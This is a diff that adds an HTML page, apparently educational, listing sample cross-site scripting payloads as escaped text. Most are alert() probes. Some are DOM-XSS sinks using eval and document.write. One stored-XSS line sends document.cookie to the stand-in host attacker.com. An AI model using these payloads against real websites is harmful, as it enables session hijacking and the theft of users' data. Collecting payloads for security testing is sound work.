@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Payload Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+            color: #00ff00;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #00ff00;
+        }
+        .payload {
+            background: #000;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: monospace;
+            border-left: 3px solid #ff4444;
+        }
+        .warning {
+            background: #ff4444;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 XSS Payload Demonstration</h1>
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This is a demonstration payload for educational purposes only.
+            Use only in controlled testing environments.
+        </div>
+        
+        <h2>Sample XSS Payloads:</h2>
+        
+        <div class="payload">
+            &lt;script&gt;alert('XSS')&lt;/script&gt;
+        </div>
+        
+        <div class="payload">
+            &lt;img src=x onerror=alert('XSS')&gt;
+        </div>
+        
+        <div class="payload">
+            &lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;
+        </div>
+        
+        <div class="payload">
+            javascript:alert('XSS')
+        </div>
+        
+        <div class="payload">
+            &lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
+        </div>
+        
+        <h2>DOM XSS Examples:</h2>
+        <div class="payload">
+            &lt;script&gt;document.write(location.hash.substring(1))&lt;/script&gt;
+        </div>
+        
+        <div class="payload">
+            &lt;script&gt;eval(location.search.substring(1))&lt;/script&gt;
+        </div>
+        
+        <h2>Stored XSS Examples:</h2>
+        <div class="payload">
+            &lt;script&gt;fetch('/api/user').then(r=&gt;r.json()).then(d=&gt;alert(d.email))&lt;/script&gt;
+        </div>
+        
+        <div class="payload">
+            &lt;script&gt;new Image().src='http://attacker.com/steal?cookie='+document.cookie;&lt;/script&gt;
+        </div>
+        
+        <h2>Reflected XSS Examples:</h2>
+        <div class="payload">
+            &lt;script&gt;alert(document.referrer)&lt;/script&gt;
+        </div>
+        
+        <div class="payload">
+            &lt;script&gt;alert(navigator.userAgent)&lt;/script&gt;
+        </div>
+        
+        <p><em>This file demonstrates various XSS payloads that can be used for testing web application security.</em></p>
+    </div>
+</body>
+</html>
